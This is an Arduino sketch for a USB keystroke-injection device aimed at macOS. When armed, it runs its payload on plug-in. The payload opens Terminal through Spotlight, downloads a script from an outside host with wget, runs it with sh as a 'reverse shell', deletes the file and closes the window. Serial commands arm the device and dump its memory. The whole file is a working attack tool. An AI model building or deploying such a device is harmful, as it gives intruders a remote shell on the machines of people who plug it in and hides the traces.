#include "Keyboard.h"
#include <EEPROM.h>

#define LED_PIN 8

void setup()
{
  Serial.begin(9600);
  Keyboard.begin();
  analogReference(INTERNAL);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, (EEPROM.read(0)) ? HIGH : LOW);  
  delay(1000);

  // execute payload if armed
  if (EEPROM.read(0))
    payload();
}

void loop()
{
  if (Serial.available() > 0)
  {
    int inByte = Serial.read();
    //Serial.print("> ");
    //Serial.println(inByte, DEC);

    switch (inByte)
    {
      // enable/disable payload mode
      case 48:
        EEPROM.update(0, !EEPROM.read(0));
        Serial.print("Armed state = ");
        Serial.println(EEPROM.read(0));
        digitalWrite(LED_PIN, (EEPROM.read(0)) ? HIGH : LOW);        
        break;

      // enable/disable test led
      case 49:
        digitalWrite(LED_PIN, !digitalRead(LED_PIN));
        Serial.print("Led ");
        Serial.println((digitalRead(LED_PIN)) ? "online" : "offline");
        break;

      // get chip voltage
      case 50:
        Serial.print("Voltage: ");
        Serial.print(getVoltage(), DEC);
        Serial.println("mV");
        Serial.println(".");
        break;
        
      // execute keyboard payload
      case 51:
        Serial.println("Executing payload.. hands off the keyboard!");
        payload();
        break;
        
      // dump EEPROM contents
      case 52:
        Serial.print("EEPROM length: ");
        Serial.println(EEPROM.length());
        
        Serial.println("Dumping contents..");

        for (int index = 0; index < EEPROM.length() ; ++index)
        {
          Serial.println("Read index: " + index);
          int value = EEPROM.read(index);
          
          Serial.print("0x");
          Serial.print(index);
          Serial.print(": \t");
          Serial.println(value, DEC);
        }

        Serial.println("Done.");
        
        break;
        
      default:
        Serial.print("Try entering something that is not: ");
        Serial.println(inByte, DEC);
    }
  }
}

void payload()
{
    // launch spotlight/alfred
    Keyboard.press(KEY_RIGHT_GUI);
    Keyboard.write((char) 0x20);
    Keyboard.releaseAll();

    delay(1000);
    
    // open terminal
    Keyboard.println(F("Terminal.app"));
    
    // wait 1.5 seconds - should be enough time for spotlight/alfred to react
    delay(1500);
    
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    // wait 3 seconds for terminal to open
    delay(2500);
    
    // new window
    Keyboard.press(KEY_RIGHT_GUI);
    Keyboard.write('n');
    delay(200);
    Keyboard.releaseAll();

    // wait 1 second for a new terminal to open
    delay(1000);

    // remove previous files, if any
    Keyboard.println(F("rm index.html"));
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();
    
    // reverse shell
    Keyboard.println(F("wget shell.theforce.dk"));
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();
    
    Keyboard.println(F("sh index.html"));
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();

    Keyboard.println(F("rm index.html"));
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();
    
    delay(500);
    
    // bye!
    Keyboard.println(F("exit"));
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}

long getVoltage()
{
  long result;
  
  // read 1.1V reference against AVcc
  // set the reference to Vcc and the measurement to the internal 1.1V reference
  #if defined(__AVR_ATmega32U4__) || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__)
    ADMUX = _BV(REFS0) | _BV(MUX4) | _BV(MUX3) | _BV(MUX2) | _BV(MUX1);
  #elif defined (__AVR_ATtiny24__) || defined(__AVR_ATtiny44__) || defined(__AVR_ATtiny84__)
    ADMUX = _BV(MUX5) | _BV(MUX0);
  #elif defined (__AVR_ATtiny25__) || defined(__AVR_ATtiny45__) || defined(__AVR_ATtiny85__)
    ADMUX = _BV(MUX3) | _BV(MUX2);
  #else
    ADMUX = _BV(REFS0) | _BV(MUX3) | _BV(MUX2) | _BV(MUX1);
  #endif  
  
  delay(10); // wait for Vref to settle
  
  ADCSRA |= _BV(ADSC); // start ADC
  while (bit_is_set(ADCSRA, ADSC)); // measuring
  
  uint8_t low  = ADCL; // must read ADCL first - it then locks ADCH  
  uint8_t high = ADCH; // unlocks both
  
  result = (high<<8) | low;
  result = 1125300L / result; // calculate Vcc (in mV); 1125300 = 1.1*1023*1000
  
  return result; // vcc in millivolts
}

